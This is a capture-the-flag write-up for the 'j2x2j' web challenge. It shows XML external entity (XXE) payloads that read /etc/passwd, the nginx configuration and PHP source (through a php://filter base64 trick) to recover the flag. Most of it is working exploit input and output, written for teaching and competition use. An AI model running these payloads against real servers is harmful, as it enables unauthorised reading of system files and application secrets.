# j2x2j
### Category: Web/Warmup

j2x2j provides a website, `http://j2x2j.chal.ctf.westerns.tokyo/` which allows for converting from JSON to XML and XML to JSON.  Watching the network, it's clear that it does this server-side, which opens up the possibility for a fairly standard XXE.

We first tried an extremely standard XXE payload, and were met with success:

###### Input
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

###### Output
```json
{
    "user": "root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\n...", // (clipped)
    "pass": "mypass"
}
```

Ok, great, so let's go ahead and read the flag then:

###### Input
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///flag">]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

###### Output
```
failed to decode xml
```

Hmmm... maybe the flag's not there, or maybe we're hitting some kind of parsing restriction?  Ok, let's poke around a bit to figure out where the source probably is.  We know from the response headers that the site is running under nginx, so let's read the nginx configuration:

###### Input
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/nginx/sites-enabled/default">]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

###### Output
```json
{
    "user": "##\n# You should look at the following URL's in order to grasp a solid understanding\n...", // (reproduced below)
    "pass": "mypass"
}
```

###### Output (readable)
```
##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# [...clipped...]
##

server {
	listen 80 default_server;
	listen [::]:80 default_server;

	# [...clipped...]

	root /var/www/html;

	# [...clipped...]
}


# [...clipped...]
```

Looks like everything is in the default location, so we should be able to find the source file at `/var/www/html/index.php` (since loading `http://j2x2j.chal.ctf.westerns.tokyo/index.php` gives the same response as `http://j2x2j.chal.ctf.westerns.tokyo/`):

###### Input
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///var/www/html/index.php">]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

###### Output
```json
failed to decode xml
```

Hmm, that's likely because the tags present in `index.php` cause the input to not be parseable as valid XML.  Fortunately, since this is getting loaded from PHP, we have PHP filters at our disposal, so let's base64-encode the file before fetching it:

###### Input
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

###### Output
```json
{
    "user": "PD9waHAKaW5jbHVkZSAnZmxhZy5waHAnOwoKJG1ldGhvZCA9ICRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddOwoKZnVuY3Rpb24gZGllNDA0KCRtc2cpIHsKICBodHRwX3Jlc3B...", // (clipped)
    "pass": "mypass"
}
```

###### Output (decoded)
```php
<?php
include 'flag.php';

$method = $_SERVER['REQUEST_METHOD'];

function die404($msg) {
  http_response_code(404);
  die($msg);
}

// (clipped because the rest is irrelvant)
}
```

Ah, looks like the flag's in `flag.php`.  So let's get that:

###### Input
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag.php">]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

###### Output
```json
{
    "user": "PD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsK",
    "pass": "mypass"
}
```

###### Output (decoded)
```php
<?php
$flag = 'TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}';
```

So there we go: `TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}`.